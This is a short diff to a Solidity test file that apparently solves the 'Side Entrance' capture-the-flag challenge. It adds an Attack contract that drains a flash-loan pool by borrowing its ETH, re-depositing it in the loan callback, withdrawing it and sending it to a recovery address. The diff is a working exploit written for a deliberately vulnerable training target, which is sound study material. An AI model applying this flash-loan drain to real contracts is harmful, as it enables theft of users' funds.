@@ -45,7 +45,7 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        new Attack().run(pool, recovery, ETHER_IN_POOL);
     }
 
     /**
@@ -55,4 +55,23 @@ contract SideEntranceChallenge is Test {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
     }
+}
+
+contract Attack {
+    SideEntranceLenderPool pool;
+
+    function run(SideEntranceLenderPool _pool, address recovery, uint256 amount) public {
+        pool = _pool;
+
+        pool.flashLoan(amount);
+        pool.withdraw();
+        (bool sent,) = recovery.call{value: amount}("");
+        require(sent, "failed to send ether");
+    }
+
+    function execute() public payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
 }
